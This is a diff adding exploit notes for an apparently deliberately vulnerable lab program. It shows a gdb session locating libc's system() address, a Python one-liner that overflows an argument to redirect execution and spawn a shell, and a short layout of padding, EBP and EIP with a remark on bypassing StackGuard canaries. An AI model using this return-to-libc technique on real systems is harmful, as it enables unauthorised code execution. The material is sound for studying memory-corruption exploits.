@@ -1,0 +1,31 @@
+$ gdb -q ./rewrite-argument 
+Reading symbols from ./rewrite-argument...done.
+(gdb) b main
+Breakpoint 1 at 0x80484e2: file rewrite-argument.c, line 20.
+(gdb) r
+Starting program: /home/lain/cvuln/rewrite-argument/rewrite-argument 
+
+Breakpoint 1, main (argc=1, argv=0xbffff4d4) at rewrite-argument.c:20
+20	  if (argc != 2) {
+(gdb) p &system
+$1 = (<text variable, no debug info> *) 0xb7e30150 <__libc_system>
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 4219] will be killed.
+
+Quit anyway? (y or n) y
+[lain@ca647 rewrite-argument]$ USER=/bin/sh ./rewrite-argument $(python -c 'print("A"*16+"\x50\x01\xe3\xb7")')
+Your real name is...
+sh-4.3$ id
+uid=1001(lain) gid=1001(lain) groups=1001(lain) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+sh-4.3$ exit
+vSegmentation fault (core dumped)
+
+
+8 padding
+4 EBP
+4 EIP
+
+This approachs is bypassing possible canaries located between saved
+EBP and local variables (StackGuard).
